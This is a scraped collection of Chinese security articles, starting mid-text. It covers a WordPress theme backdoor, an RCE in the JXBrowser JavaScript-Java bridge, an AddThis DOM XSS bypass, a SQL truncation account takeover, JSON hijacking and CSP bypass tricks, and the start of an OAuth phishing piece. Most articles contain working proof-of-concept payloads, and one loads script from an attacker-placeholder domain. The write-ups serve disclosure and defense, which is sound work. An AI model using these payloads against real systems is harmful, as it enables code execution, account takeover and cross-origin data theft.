true)。而wp_set_auth_cookie的作用是只需提供用户id即可实现登录（https://developer.wordpress.org/reference/functions/wpsetauth_cookie/），我们实际操作一下：未登录状态：访问http://url/index.php?cperpage=1：可以看到已经以管理员身份登录了，原来这里才是真正的后门所在。总的来说该后门的功能如下：启用后主题后每当有人访问网站就检查网站中的所有主题是否已被感染，然后感染未被感染的主题。每当有人访问，检查是否曾向livethemes@gmail.com发送邮件，若没有将网站url发送到livethemes@gmail.com。攻击者通过访问http://url/index.php?cperpage=1即可以管理员的身份登录使用被感染主题的网站。0x02 影响 &amp; 溯源起初我们怀疑后门是由售卖主题的网站植入，但是我们发现该网站也是存在这个后门的：不过有意思的是该网站的后门文件是上面所说的以前就被披露出的版本，和我们手中主题中的后门并不完全相同。我们推断该网站售卖的主题是网站拥有者在其他主题的基础上更改的，而这些主题是被感染过的，但站长并没有对其进行检查。随后我们又测试了另外一些售卖主题的网站，其中一个在百度搜索中排名十分靠前的网站也存在该后门：庆幸的是我们在这网站上下载的一些主题并不存在后门，但是这些高权重网站若被恶意利用后果将不堪设想。源头在哪里？通过这篇文章我们可以看到有人评论说 http://www.themes2wp.com （需挂代理访问，国内访问会403）上的主题均存在该后门，我们下载了最新的主题（11月13日发布）发现确实如此，并且该网站本身并不存在后门。不过该网站上的主题存在的后门是上面所提到的以前的版本，和我们的样本在变量名上有一定差别。通过一段时间的探索，我们发现该网站上的主题是从其他网站下载的，例如 https://flexithemes.com，我们可以在其源码中搜索到相关内容：但是我们对比从两个网站下载的相同的主题：可以看到后者在前者的基础上在functions.php中添加了恶意代码，并在siderbar.php中添加了外链，外链域名与这个网站域名是同一个组织注册的：所以总的来说 http://www.themes2wp.com 有很大的嫌疑是传播的源头，它首先从其他一些免费主题下载站下载主题，然后向其中注入恶意代码并重新打包再提供给用户下载，并且可能有另一批人对后门进行了更改后再进行传播。www.themes2wp.com 于2009年注册，如果它真的是传播源头，仅从时间跨度上来看影响也是很大的。0x03 受感染主机数据分析我们根据该后门的特征，对ZoomEye中记录的400多万域名进行了扫描，发现近8000台主机受到了感染。对于这些受感染的主机，我们做了如下统计。国家分布统计IP统计经检测，受到感染的近8000个域名中只对应了3000多个IP，我们统计了IP绑定域名的情况。这些IP中大约有百分之二十以上的IP绑定了多个域名。可能一个域名被感染后，导致同一个IP下的域名都被感染。网站title统计通过对重复title的统计可以看出，除了HTTP状态页面301页面以外，剩下重复的title数量极少。我们可以做出的判断是，这个后门影响着各个行业的网站，而不是针对某个特定的行业。通过对网站title词频统计分析，可以看到娱乐城（黑色部分）有关的约占了四分之一。 为了了解国内的影响情况，我们统计了国内外title的词频，结果如下:通过上图的统计，在国内的title中我们没有发现黑产的踪迹。国外title中我们找到了更多的黑产的关键词。根据以上词频统计的结果，一共937个网站首页包含娱乐这个关键词，其中位于美国的网站就有720个。在8000个存在后门的网站中,中文网站大约占了二分之一，其中就有近千网站与黑产有关。后门利用流程0x04 检测 &amp; 修复检测：可以使用 Seebug 照妖镜进行在线检测。修复：删除网站目录下所有主题的funcions.php中的恶意代码通过日志检查攻击者在获取管理员权限后又进行了哪些敏感操作0x05 参考https://developer.wordpress.org/reference/functions/wpsetauth_cookie/http://ihacklog.com/post/wordpress-theme-malicious-code-analysis.htmlhttp://harmonyinfotech.in/cms/wordpress-cms/wordpress-virus-function-checkisactive_widgets/","2016-12-12 15:47:40","Web安全","Wordpress functions.php 主题文件后门分析","http://nsoad.com/Article/web/20161212/912.html"
"5ccbf9e94f2f0a0a7a69bfe1","最近发现自己在使用 JXBrowser 给实验性扫描技术制作原型，这是一个在 Java 应用中使用类似 PhantomJS 浏览器的库。","kong","最近发现自己在使用 JXBrowser 给实验性扫描技术制作原型，这是一个在 Java 应用中使用类似 PhantomJS 浏览器的库。在使用 JXBrowser 库创建 JavaScript 与 Java 之间的桥接时，我很好奇是否可以通过调用与现有不同的类，来攻击 JXBrowser 的客户端页面，从而实现远程代码执行的目的。我的 JavaScript to Java bridge 如下所示：browser.addScriptContextListener(new ScriptContextAdapter() {      @Override    public void onScriptContextCreated(ScriptContextEvent event) {        Browser browser = event.getBrowser();        JSValue window = browser.executeJavaScriptAndReturnValue(""window"");        window.asObject().setProperty(""someObj"", new someJavaClass());    }});本例取自 JXBrowser 演示站点，基本原理是将一个脚本注入到浏览器实例中，检索 window 对象并将其转换为 Java JSValue 对象，然后将 ""someObj"" 设置到 window 上，并将 Java 对象传递给 JavaScript window对象。如此，便桥接成功了。相关文档说，只能使用公共类。一旦我们创建了一个桥，我们就需要一些 JavaScript 与之交互。setTimeout(function f(){      if(window.someObj &amp;&amp; typeof window.someObj.javaFunction === 'function') {      window.someObj.javaFunction(""Called Java function from JavaScript"");    } else {       setTimeout(f,0);    }},0);我们有一个 setTimeout 来检测 ""someObj"" 属性的存在，它不会调用自身，除非我们这么做。我首先尝试使用 getRuntime() 查看是否可以获取运行时（runtime）对象的一个实例并执行 calc。我是这么调用的：window.someObj.getClass().forName('java.lang.Runtime').getRuntime();  得到以下错误回显：Neither public field nor method named 'getRuntime' exists in the java.lang.Class Java object.(找不到 getRuntime 方法)难道不能调用 getRuntime？我试着用更简单方法：window.someObj.getClass().getSuperclass().getName();  貌似有效。我也试过枚举现有方法。methods = window.someObj.getClass().getSuperclass().getMethods();  for(i=0;i&lt;methods.length();i++) {     console.log(methods[i].getName());}wait  wait  wait  equals  toString  hashCode  getClass  notify  notifyAll  所以我能够成功枚举出这些方法。我决定尝试使用 ProcessBuilder ，看看接下来会发生什么。但每次试图调用构造函数时，我都失败了。看起来构造函数要求一个 Java 数组。这样的话，我需要创建一个 Java 数组的字符串，以便将它传递给 ProcessBuilder 构造函数。window.someObj.getClass().forName(""java.lang.ProcessBuilder"").newInstance(""open"",""-a Calculator"");  //Failedwindow.someObj.getClass().forName(""java.lang.ProcessBuilder"").newInstance([""open"",""-a Calculator""]);  //Failed too 稍微抛开这个问题，我试着创建另一个对象，证明了漏洞的存在。现在可以成功创建 java.net.Socket 类的一个实例。window.someObj.getClass().forName(""java.net.Socket"").newInstance();  我试图调用这个对象的 ""connect"" 方法，却遇到了参数类型不正确的问题。这确实证明，尽管我可以创建 socket 对象，但我不能使用它们，好在我可以创建它们。而这里需要注意一点，我没有给此方法传递任何参数。接下来我又试了 java.io.File 类，也失败了。我别无选择只能使用反射，但任何时候我都不能给函数提供正确类型的参数。newInstance 不可行，同样不能调用。我需要援助，我需要 Java 专家帮我。幸运的是，在 Portswigger 工作，你永远不是屋子里最聪明的那个 :)。我向 Mike 和 Patrick 寻求帮助。我说明了将参数传递给函数要求一个 Java 数组的问题，所以我们开始寻求在 Java-JavaScript 桥中创建数组的方法。Mike 认为使用数组列表可以解决，因为我们可以方便地使用 toArray 方法，将其转换为一个数组。list = window.someObj.getClass().forName(""java.util.ArrayList"").newInstance();  list.add(""open"");  list.add(""-a"");  list.add(""Calculator"");  a = list.toArray();  window.someObj.getClass().forName(""java.lang.ProcessBuilder"").newInstance(a));  这次的函数调用抛出了没有该方法的异常，并声明了我们的参数传递实际上是一个 JSObject。因此，即使我们创建了一个 ArrayList，toArray 被桥转换为一个 JS 对象，因此错误的参数类型被发送到进程生成器。然后，我们尝试创建一个 Array。我们又使用了反射，在 java.lang.reflect.Array 上调用了新的实例。但它再次抛出参数类型不正确的异常，我们发送一个 double，但它要求一个 int。然后我们尝试使用 java.lang.Integer 。但是还是遇到这个问题。Patrick 认为我们可以使用 MAX_INT 属性创建一个巨大的数组 :) ，至少我们会得到 int 。然而“桥”把来自 java 的 int 转换为 double。这便是我们试过的：list = window.someObj.getClass().forName(""java.util.ArrayList"").newInstance();  list.add(""open"");  list.add(""-a"");  list.add(""Calculator"");  a = list.toArray();  window.someObj.getClass().forName(""java.lang.ProcessBuilder"").newInstance(a));  我们得到了空指针异常，而且没有参数也不行，但这就是 JavaScript ，我想，为何没发送 123，将其作为参数。我认为它不会生效，但它实际上输出了我们的 max int。我们继续尝试用 max int 调用 Array 构造函数，当然也失败了。然后我们决定查看运行时（runtime）对象，看看能否使用相同的技术。Mike 建议使用 getDeclaredField ，并获取当前运行时的属性，使其可被访问，因为它是一个私有属性，我们很开心地看到弹出了计算器。field = window.someObj.getClass().forName('java.lang.Runtime').getDeclaredField(""currentRuntime"");  field.setAccessible(true);  runtime = field.get(123);  runtime.exec(""open -a Calculator"");  这意味着通过使用 JavaScript-Java 桥的代码在 JXBrowser 中呈现的网站，都可能完全控制客户端。我们私下向 TeamDev（JXBrowser 的制造商）报告了这个问题，他们发布了一个补丁，支持使用 @JSAccessible 注释规定允许的属性/方法的白名单。请注意，如果应用程序在任何地方都不使用 @JSAccessible 注释，白名单不会被强制执行，上述利用脚本依然有效。","2016-12-10 13:03:30","Web安全","RCE in JXBrowser JavaScript/Java bridge","http://nsoad.com/Article/web/20161210/908.html"
"5ccbf9e94f2f0a0a7a69bfe2","说明：这个漏洞是 https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/ 修复的绕过，目前已经报告给AddThis并得到修复。","Kong","背景说明：这个漏洞是 https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/ 修复的绕过，目前已经报告给AddThis并得到修复。AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公司拥有的一个社会性书签服务。它可以与网站进行整合，访客即可用它将网站上的某些内容通过其他网络服务收藏或分享，诸如Facebook、MySpace、Google书签、Twitter等 From https://zh.wikipedia.org/wiki/AddThis使用的例子有：分析使用这款插件，需要在网页上加入类似以下的代码&lt;!-- Go to www.addthis.com/dashboard to customize your tools --&gt;  &lt;script src=""//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-538ceb912f1cca19"" async=""async""&gt;&lt;/script&gt;  当插件加载完成后，就会监听message事件。看完前面提到的那篇文章之后，我们可以知道在这个事件处理函数中，如果message事件处理函数接收到一个 合法来源 的消息，消息内容如下：at-share-bookmarklet://example.com/xss.js时，就会动态在页面中插入指定的JS脚本。之前的漏洞是在这里根本没有检查消息的来源就直接加载执行导致了DOM XSS，原先的PoC：&lt;iframe id=""frame"" src=""https://targetpage/using_addthis""&gt;&lt;/iframe&gt;&lt;script&gt;  document.getElementById('frame').contentWindow.postMessage('at-share-bookmarklet://ATTACKERDOMAIN/xss.js', '*');  &lt;/script&gt;  AddThis对这个漏洞进行的修复如下： 1. 添加检查当前窗口是不是被嵌套在：iframe, frame等标签里，如果是，则不监听message事件。 2. 检查来源修复后的代码如下：, c = window.parent === window;...c &amp;&amp; u(window, ""message"", function(e) {    if (e) {      var t = _atr.substring(0, _atr.length - 1)        , n = e.origin.indexOf(t) === ""https:"".length || e.origin.indexOf(t) === ""http:"".length || /^https?:\/\/(localhost:\d+|localhost$)/.test(e.origin)        , o = ""string"" == typeof e.data;      if (o &amp;&amp; n) {          var a = e.data.match(/at\-share\-bookmarklet\:(.+?)$/) || []            , i = a[1];          if (i) {              try {                  _ate.menu.close()              } catch (s) {}              r(i)          }      }  }})其中_attr的值为//s7.addthis.com/，那么t的值就是//s7.addthis.come.origin是调用了postMessage这个API的来源什么时候o &amp;&amp; n的值会是真呢？例如站点：http://s7.addthis.com/向目标站点发送消息的时候但这个修复真的没有问题了吗？在使用postMessage进行跨域通信的时候，有以下几种场景：父窗口与iframe，frame等标签里的子网页进行通信，即上面那个PoC使用window.open打开一个新的窗口  var win = window.open(""http://target.com/index.html"");  win.postMessage(""this is a message"", ""*"");http://target.com/index.html这个页面就可以监听message事件获取到以上的消息。也就是说，对于一个安装了这个插件的目标站点，我们依旧可以通过方法2发送一个消息给他。另外，这里的域名检查也不完善，简单的说，只要是s7.addthis.com开头的域名都是合法的，如s7.addthis.com.evil.com&gt; e.origin = 'http://s7.addthis.com.evil.com'&gt; e.origin.indexOf(t) === ""http:"".length&lt; true  PoC你现在在看的这个页面就加载了有漏洞的那个AddThis脚本，我部署了一个PoC，来XSS当前页面，可以实际感受一下: http://s7.addthis.com.poc.akrxd.net/addthis_poc/poc.html&lt;script type=""text/javascript"" src=""https://cdn.rawgit.com/zhchbin/zhchbin.github.io/source/js/addthis_widget.js""&gt;&lt;/script&gt;","2016-12-27 20:29:18","Web安全","分享插件 AddThis 导致的 DOM XSS","http://nsoad.com/Article/web/20161227/939.html"
"5ccbf9e94f2f0a0a7a69bfe3","绝大部分开发者都意识到SQL注入漏洞的存在，在本文我想与读者共同去探讨另一种与SQL数据库相关的漏洞，其危害与SQL注入不相上下。","鸢尾","前言值得庆幸的是如今开发者在构建网站时，已经开始注重安全问题了。绝大部分开发者都意识到SQL注入漏洞的存在，在本文我想与读者共同去探讨另一种与SQL数据库相关的漏洞，其危害与SQL注入不相上下，但却不太常见。接下来，我将为读者详细展示这种攻击手法，以及相应的防御策略。注意：本文不是讲述SQL注入攻击背景介绍最近，我遇到了一个有趣的代码片段，开发者尝试各种方法来确保数据库的安全访问。当新用户尝试注册时，将运行以下代码：&lt;?php// Checking whether a user with the same username exists$username = mysql_real_escape_string($_GET['username']);$password = mysql_real_escape_string($_GET['password']);$query = ""SELECT *          FROM users          WHERE username='$username'"";$res = mysql_query($query, $database);if($res) {  if(mysql_num_rows($res) &gt; 0) {    // User exists, exit gracefully    .    .  }  else {    // If not, only then insert a new entry    $query = ""INSERT INTO users(username, password)              VALUES ('$username','$password')"";    .    .  }}使用以下代码验证登录信息：&lt;?php$username = mysql_real_escape_string($_GET['username']);$password = mysql_real_escape_string($_GET['password']);$query = ""SELECT username FROM users          WHERE username='$username'              AND password='$password' "";$res = mysql_query($query, $database);if($res) {  if(mysql_num_rows($res) &gt; 0){      $row = mysql_fetch_assoc($res);      return $row['username'];  }}return Null;安全考虑:过滤用户输入参数了吗？ — 完成检查使用单引号（’）来增加安全性了吗？ — 完成检查按理说应该不会出错了啊？然而，攻击者依然能够以任意用户身份进行登录！攻击手法在谈论这种攻击手法之前，首先我们需要了解几个关键知识点。在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。SELECT * FROM users WHERE username='vampire     ';但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”。现在，让我们建立一个测试数据库来演示具体攻击过程。vampire@linux:~$ mysql -u root -pmysql&gt; CREATE DATABASE testing;Query OK, 1 row affected (0.03 sec)mysql&gt; USE testing;Database changed接着创建一个数据表users，其包含username和password列，并且字段的最大长度限制为25个字符。然后，我将向username字段插入“vampire”，向password字段插入“my_password”。mysql&gt; CREATE TABLE users (    -&gt;   username varchar(25),    -&gt;   password varchar(25)    -&gt; );Query OK, 0 rows affected (0.09 sec)mysql&gt; INSERT INTO users    -&gt; VALUES('vampire', 'my_password');Query OK, 1 row affected (0.11 sec)mysql&gt; SELECT * FROM users;+----------+-------------+| username | password    |+----------+-------------+| vampire  | my_password |+----------+-------------+1 row in set (0.00 sec)为了展示尾部空白字符的修剪情况，我们可以键入下列命令：mysql&gt; SELECT * FROM users    -&gt; WHERE username='vampire       ';+----------+-------------+| username | password    |+----------+-------------+| vampire  | my_password |+----------+-------------+1 row in set (0.00 sec)现在我们假设一个存在漏洞的网站使用了前面提到的PHP代码来处理用户的注册及登录过程。为了侵入任意用户的帐户（在本例中为“vampire”），只需要使用用户名“vampire[许多空白符]1”和一个随机密码进行注册即可。对于选择的用户名，前25个字符应该只包含vampire和空白字符，这样做将有助于绕过检查特定用户名是否已存在的查询。mysql&gt; SELECT * FROM users    -&gt; WHERE username='vampire                   1';Empty set (0.00 sec)需要注意的是，在执行SELECT查询语句时，SQL是不会将字符串缩短为25个字符的。因此，这里将使用完整的字符串进行搜索，所以不会找到匹配的结果。接下来，当执行INSERT查询语句时，它只会插入前25个字符。mysql&gt;   INSERT INTO users(username, password)    -&gt; VALUES ('vampire                   1', 'random_pass');Query OK, 1 row affected, 1 warning (0.05 sec)mysql&gt; SELECT * FROM users    -&gt; WHERE username='vampire';+---------------------------+-------------+| username                  | password    |+---------------------------+-------------+| vampire                   | my_password || vampire                   | random_pass |+---------------------------+-------------+2 rows in set (0.00 sec)很好，现在我们检索“vampire”的，将返回两个独立用户。注意，第二个用户名实际上是“vampire”加上尾部的18个空格。现在，如果使用用户名“vampire”和密码“random_pass”登录的话，则所有搜索该用户名的SELECT查询都将返回第一个数据记录，也就是原始的数据记录。这样的话，攻击者就能够以原始用户身份登录。这个攻击已经在MySQL和SQLite上成功通过测试。我相信在其他情况下依旧适用。防御手段毫无疑问，在进行软件开发时，需要对此类安全漏洞引起注意。我们可采取以下几项措施进行防御：将要求或者预期具有唯一性的那些列加上UNIQUE约束。实际上这是一个涉及软件开发的重要规则，即使你的代码有维持其完整性的功能，也应该恰当的定义数据。由于’username’列具有UNIQUE约束，所以不能插入另一条记录。将会检测到两个相同的字符串，并且INSERT查询将失败。最好使用’id’作为数据库表的主键。并且数据应该通过程序中的id进行跟踪为了更加安全，还可以用手动调整输入参数的限制长度（依照数据库设置）","2017-01-06 12:07:06","Web安全","基于约束的SQL攻击","http://nsoad.com/Article/web/20170106/989.html"
"5ccbf9ea4f2f0a0a7a69bfe4","Benjamin Dumke-von der Ehe 发现了一种有趣的跨域窃取数据的方法。","kong","Benjamin Dumke-von der Ehe 发现了一种有趣的跨域窃取数据的方法。使用JS 代理，他能够创建一个 handler，可以窃取未定义的 JavaScript 变量。这个问题在 FireFox 浏览器中似乎被修复了，但是我发现了一种对 Edge 进行攻击的新方式。虽然 Edge 好像是阻止了分配 window.__proto__ 的行为，但他们忘了 Object.setPrototypeOf 这个方法。利用这个方法，我们可以使用代理过的 __proto__ 来覆盖 __proto__ 属性。就像这样：&lt;script&gt;  Object.setPrototypeOf(__proto__,new Proxy(__proto__,{   has:function(target,name){  alert(name); }}));&lt;/script&gt;  &lt;script src=""external-script-with-undefined-variable""&gt;&lt;/script&gt;  &lt;!-- script contains: stealme --&gt;  Edge PoC stealing undefined variable如果你在跨域脚本中包含 stealme，你将会看到浏览器弹出了该值的警告，即它是一个未定义的变量。经过进一步的测试，我发现通过覆盖__proto __.__ proto__可以实现相同的效果，在 Edge 浏览器上对应的是 [object EventTargetPrototype] 。&lt;script&gt;  __proto__.__proto__=new Proxy(__proto__,{   has:function(target,name){  alert(name); }});&lt;/script&gt;  &lt;script src=""external-script-with-undefined-variable""&gt;&lt;/script&gt;  Edge PoC stealing undefined variable method 2很好，我们已经能跨域窃取数据了，但我们还能做什么呢？所有主流浏览器都支持脚本的 charset 属性。而我发现 UTF-16BE 字符集尤其有意思。UTF-16BE 是一个多字节编码的字符集，那么实际上是两个字节组成了一个字符。例如你的脚本以 ["" 开头，它将被认为是 0x5b22 而不是 0x5b 0x22。而 0x5b22 恰好是一个有效的 JavaScript 变量 =) 你能看懂这是怎么回事吗？假设我们有一个来自 Web 服务器的响应，返回一个数组文本，我们便可以控制它的一部分。我们可以使用 UTF-16BE 字符集使数组文本成为未定义的 JavaScript 变量，并使用上面的技术窃取到它。唯一要注意的是，组成的字符必须形成一个有效的 JavaScript 变量。例如，让我们看看以下响应：[""supersecret"",""input here""]为了窃取到 supersecret，我们需要注入一个空字符，后面带着两个 a's ，出于某些原因，Edge 不会将其视为 UTF-16BE，除非它具有这些注入的字符。或许它在进行一些字符编码的扫描，亦或是截断响应和 NULL 后面的字符在 Edge 上不是一个有效的 JS 变量。这点我不确定，但是在我的测试中，似乎需要一个 NULL 与其他一些填充字符。参见下面的例子：&lt;!doctype HTML&gt;  &lt;script&gt;  Object.setPrototypeOf(__proto__,new Proxy(__proto__,{      has:function(target,name){        alert(name.replace(/./g,function(c){ c=c.charCodeAt(0);return String.fromCharCode(c&gt;&gt;8,c&amp;0xff); }));    }}));&lt;/script&gt;  &lt;script charset=""UTF-16BE"" src=""external-script-with-array-literal""&gt;&lt;/script&gt;  &lt;!-- script contains the following response: [""supersecret"",""&lt;?php echo chr(0)?&gt;aa""] --&gt;  Edge PoC stealing JSON feeds所以我们像以前一样代理 __proto__ 属性，使用 UTF-16BE 编码包含此脚本，而且响应的字符文本中包含了一个 NULL，后面跟着两个 a's。然后我解码了移八位编码的 UTF-16BE ，获得第一个字节；并且通过按位“与”操作获得了第二个字节。结果是一个警告的弹出窗口， [""supersecret"",""。如你所见，Edge 似乎在 NULL 后截断了响应。请注意这种攻击是相当受限的，因为许多字符组合不会产生有效的 JavaScript 变量。然而，窃取少量数据可能是有用的。在 Chrome 中窃取 JSON 推送情况变得更糟了。Chrome 更加开放，有更多的异域字符编码。你不需要控制任何响应，Chrome 就可以使用该字符编码。唯一的要求便是之前所述，组合在一起的字符产生了一个有效的 JavaScript 变量。为了利用这个“特征”，我们需要另一个未定义的变量泄漏。一眼看上去 Chrome 似乎阻止了覆盖 __proto__ 的行为，但是它却忘记了 __proto__ 的深度。&lt;script&gt;  __proto__.__proto__.__proto__.__proto__.__proto__=new Proxy(__proto__,{      has:function f(target,name){        var str = f.caller.toString();        alert(str.replace(/./g,function(c){ c=c.charCodeAt(0);return String.fromCharCode(c&gt;&gt;8,c&amp;0xff); }));    }});&lt;/script&gt;  &lt;script charset=""UTF-16BE"" src=""external-script-with-array-literal""&gt;&lt;/script&gt;  &lt;!-- script contains the following response: [""supersecret"",""abc""] --&gt;  注意: 这一点已经在 Chrome 54 版本被修复Chrome PoC stealing JSON feeds works in version 53我们在 __proto__ 链中深入 5 层，并用我们的代理覆盖它，接下来的事情就很有意思了。尽管命名参数不包含我们未定义的变量，但是函数的调用者是包含的！它返回了一个带有我们变量名的函数！显然它用 UTF-16BE 编码了，看起来像是这样子的：function 嬢獵灥牳散牥琢Ⱒ慢挢崊  Waaahat? 那么我们的变量是在调用者中泄漏了。你必须调用函数的 toString 方法来访问数据，否则 Chrome 会抛出一个通用访问的异常。我试着通过检查函数的构造函数，以查看是否返回了一个不同的域（也许是 Chrome 扩展程序上下文），从而进一步利用漏洞。当 adblock 被启用时，我看到了一些使用这种方法的扩展程序代码，但无法利用它因为它似乎只是将代码注入到当前的 document。在我的测试中，我也能够包含 xml 或者 HTML 跨域数据，甚至是 text/html 内容类型，这就成为一个相当严重的信息泄漏漏洞。而此漏洞已经在 Chrome 中被修复。在 Safari 中窃取 JSON 推送我们也很轻松地可以在最新版的 Safari 中实现同样的事情。我们仅需要少使用一个 proto ，并且从代理中使用 “name” 而不是调用者。&lt;script&gt;  __proto__.__proto__.__proto__.__proto__=new Proxy(__proto__,{          has:function f(target,name){            alert(name.replace(/./g,function(c){ c=c.charCodeAt(0);return String.fromCharCode(c&gt;&gt;8,c&amp;0xff); }));        }});&lt;/script&gt;  Safari PoC stealing JSON feeds经过进一步测试，我发现 Safari 和 Edge 一样受相同漏洞的影响，只需要__proto__.__proto__ 。Hacking JSON feeds without JS proxies我之前提到每个主流浏览器基本都支持 UTF-16BE 字符编码，可你要如何在没有 JS 代理的情况下黑掉 JSON feeds呢？首先，你需要控制一些数据，并且必须以生成有效 JavaScript 变量的方式构造 feed。在注入数据之前获取 JSON 推送的第一部分非常简单，你所需要做的就是输出一个 UTF-16BE 编码字符串，该字符串将非 ASCII 变量分批给特定的值，然后循环遍历该窗口并检查该值的存在，那么属性将包含注入之前的所有 JSON feed。代码如下所示：=1337;for(i in window)if(window[i]===1337)alert(i)这个代码被编码为 UTF-16BE 字符串，所以我们实际上得到的是代码而不是非 ASCII 变量。实际上，就是说用 NULL 填充每个字符。要获得注入字符串后的字符，我仅需使用增量运算符，并在窗口的属性之后制作编码后的字符串。继续往下看。setTimeout(function(){for(i in window){try{if(isNaN(window[i])&amp;&amp;typeof window[i]===/number/.source)alert(i);}))}catch(e){}}});++window.a  我将它包装在一个try catch 中，因为在 IE 上 ，当检查 isNaN 时 window.external 将会抛出一个异常。整个 JSON feed 如下所示：{""abc"":""abcdsssdfsfds"",""a"":""{C}&gt;8,c&amp;0xff);}));setTimeout(function(){for(i in window){try{if(isNaN(window[i])&amp;&amp;typeof window[i]===/number/.source)alert(i.replace(/./g,function(c){c=c.charCodeAt(0);return String.fromCharCode(c&gt;&gt;8,c&amp;0xff);}))}catch(e){}}});++window."", ""UTF-16BE"")?&gt;a"":""dasfdasdf""}Hacking JSON feeds without proxies PoC绕过 CSP你可能已经注意到，UTF-16BE 转换的字符串也会将新行转换为非 ASCII 变量，这使它甚至有可能绕过 CSP！HTML 文档将被视为 JavaScript 变量。我要做的就是注入一个带有 UTF-16BE 字符集的脚本，注入至其自身，使其具有编码过的赋值和带有尾部注释的 payload。这将绕过 CSP 策略，其只允许引用同一域下的脚本（主流策略）。HTML 文档将形似以下内容：&lt;!doctype HTML&gt;&lt;html&gt;  &lt;head&gt;  &lt;title&gt;Test&lt;/title&gt;  &lt;?php  echo $_GET['x'];  ?&gt;&lt;/head&gt;  &lt;body&gt;  &lt;/body&gt;  &lt;/html&gt;  注意在 doctype 之后没有新行，HTML 是以这样一种方式构造的，即它是有效的 JavaScript，注入后面的字符无关紧要，因为我们注入了一行注释，而且新行也会被转换。注意，在文档中没有声明字符编码的声明，并不是因为字符集很重要，因为元素的引号和属性将破坏 JavaScript。payload 看起来像是这样（注意为了构造有效变量，一个选项卡是必要的）。&lt;script%20src=""index.php?x=%2509%2500%253D%2500a%2500l%2500e%2500r%2500t%2500(%25001%2500)%2500%253B%2500%252F%2500%252F""%20charset=""UTF-16BE""&gt;&lt;/script&gt;  请注意：这在更高版本的 PHP 中已经被修复了这一点，为了防止攻击，它默认被设成 UTF-8 字符编码的 text/html 内容类型。但是，我只是添加了空白字符编码到 JSON 响应，所有他现在仍处于实验室阶段。CSP bypass using UTF-16BE PoC其他编码我 fuzz 了每个浏览器和字符编码。Edge 对 fuzz 来说没什么用，主要是由于前面提到过的字符集嗅探，如果你在文档中没有使用确定的字符，他就不会使用字符编码。Chrome 对此非常宽松，因为开发者工具让你通过正则过滤控制台的结果。我发现 ucs-2 编码允许你导入 XML 数据作为一个 JS 变量，但是它甚至比 UTF-16BE 更脆弱。我仍然设法在获得了以下的 XML，以便在 Chrome 上正确导入。Garetha  以上内容在 Chrome 中已经不再有效，但可以当做另一个例子UTF-16 和 UTF-16LE 看起来也很有用，因为脚本的输出看起来像是一个 JavaScript 变量，但是当包含 doctype，XML 或 JSON 字符串时，它们引起了一些无效的语法错误。Safari 有一些有趣的结果，但在我的车是中，我不能用它生成有相当 JavaScript。这可能值得进一步探索，，但它将很难 fuzz，因为你需要编码字符，以产生一个有效的测试用例。我相信浏览器厂商能够更有效地做到这一点。CSS你可能认为这种技术可以应用于 CSS，在理论上是可以的，因为任何 HTML 将被转换为非 ASCII 的无效 CSS 选择器。但实际上，浏览器似乎会在带着编码解析 CSS 之前，查看文档是否有 doctype 头并忽略样式表，这样注入样式表便失败了。Edge，Firefox 和 IE 在标准模式下似乎也会检查 mime 类型，Chrome 说样式表被解析了，但至少在我的测试中并不会这样。解决方案可以通过在 HTTP content type 头中声明你的字符编码（例如 UTF-8）来防止字符编码工具。PHP 5.6 还通过声明 UTF-8 编码来防止这些攻击，如果没有的话，就在 content-type 头中设置。总结Edge，Safari 和 Chrome 包含的错误让你可以跨域读取未声明的变量。你可以使用不同的编码绕过 CSP 绕过并窃取脚本数据。即使没有代理，如果可以控制一些 JSON 响应的话，你也可以窃取数据。Enjoy - @garethheyes附： 演示视频http://paper.seebug.org/papers/Archive/JSONh.mp4","2016-11-30 12:28:18","Web安全","当代 Web 的 JSON 劫持技巧","http://nsoad.com/Article/web/20161130/873.html"
"5ccbf9ea4f2f0a0a7a69bfe5","OAUTH（Open Authorization）协议为用户资源的授权提供了一个安全的、开放而又简易的标准。","kong","OAuth百科OAUTH（Open Authorization）协议为用户资源的授权提供了一个安全的、开放而又简易的标准。同时，任何第三方都可以使用OAUTH认证服务，任何服务提供商都可以实现自身的OAUTH认证服务，因而OAUTH是开放的。业界提供了OAUTH的多种实现如PHP、JavaScript，Java，Ruby等各种语言开发包，大大节约了程序员的时间，因而OAUTH是简易的。互联网很多服务如Open API，很多大公司如Google，Yahoo，Microsoft等都提供了OAUTH认证服务，这些都足以说明OAUTH标准逐渐成为开放资源授权的标准。OAuth授权有如下几个阶段，如图:第一步：申请授权在这一步，网站向IDP发起授权请求。比如说你想要从Office365获取用户的某些权限，那么你需要生成一个带有你想要请求的权限的链接，而权限则需要通过SCOPES这个参数来传递。钓鱼邮件伪装成Spotify官方，发起授权申请，这个类似网络钓鱼。    用户点击链接后，跳转到LIVE进行授权许可（当然，你保持一定的警惕的话，应该不会上当）。第二步：获取授权    当用户点击链接后会跳转到IDP（Microsoft, Google等）的授权接口，如果你还没登录，网站会要求你先登录，如果已登录，页面中会有个选择按钮让你选，YES或者NO，这个选择是将权限授予应用的最后一道屏障。上图就是用户未登录，网站要求用户登录的情况。    上图为已登录的情况下，网站向用户发出询问，是否要给应用授权。第三步：获取权限    